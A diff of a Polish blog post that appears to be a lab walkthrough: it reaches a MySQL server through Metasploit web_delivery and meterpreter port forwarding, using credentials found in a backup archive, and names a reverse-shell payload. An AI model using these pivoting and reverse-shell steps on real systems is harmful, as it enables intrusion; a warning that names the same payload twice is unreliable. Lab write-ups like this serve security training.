@@ -350,7 +350,6 @@ Już trochę lepiej, ale łamanie haseł przez pivoting to jest masakra. Nie wie
 ## MYSQL
 Wracamy do Metasploita. Na ip **172.31.20.10**, porcie **3306** jest **MYSQL**. Też możemy na niego wejść przez *msfconsole* (ile się namęczyłem, zanim mi się udało bez błędu wejść, a okazało się, że to ładunek Metasploita coś miesza, o tym w czerwonej ramce). Login i hasło na **MYSQL**-a było w archiwum **http://172.16.1.167:8115/timeclock/backup/all.zip** w pliku **db.php**. Tę operację najlepiej zrobić na świeżo odpalonym **Metasploicie**. Parę razy mi się nie udało, bo w tle musiały być jakieś pozostałości i był błąd podczas łączenia się do bazy. Port **3306** zamieniłem na **3307**, bo ktoś może używać. Jeżeli zaś **3307** jest otwarty, to należy go zamienić na inny. Więc wychodzimy z **Metasploita** i ponownie wchodzimy. Poniżej jest cała procedura:
 {: .text-justify}
-<div class="notice--primary" markdown="1">
 ```console
 msf6 exploit(multi/script/web_delivery) > exit
 use multi/script/web_delivery
@@ -433,8 +432,7 @@ meterpreter > portfwd add -l 3307 -p 3306 -r 172.31.20.10
 [*] Local TCP relay created: :3307 <-> 172.31.20.10:3306
 meterpreter >
 ```
-</div>
-Uwaga, ważne żeby na poczatku załadować ładunek **payload/linux/x86/shell_reverse_tcp**, a nie np. **payload/linux/x86/shell_reverse_tcp** i potem upgradować **Shell**. Wtedy jest problem i pomaga tylko ponowne uruchomienie Metasploita.
+Ważne żeby na poczatku załadować ładunek **payload/linux/x86/shell_reverse_tcp**, a nie np. **payload/linux/x86/shell_reverse_tcp** i potem upgradować **Shell**. Wtedy jest problem i pomaga tylko ponowne uruchomienie Metasploita.
 {: .text-justify}
 {: .notice--danger}
 Jeżeli wszystko poszło dobrze, to powinniśmy się połączyć na konsolę. Poniżej cały zapis. 
